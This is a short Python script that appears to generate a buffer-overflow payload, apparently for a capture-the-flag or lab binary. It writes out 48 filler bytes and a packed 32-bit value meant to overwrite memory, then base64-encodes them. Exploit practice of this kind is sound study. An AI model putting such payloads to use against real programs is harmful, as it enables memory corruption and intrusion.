
import sys
import struct
import base64

buf = b'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'
buf += struct.pack('<I', 1349601797)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
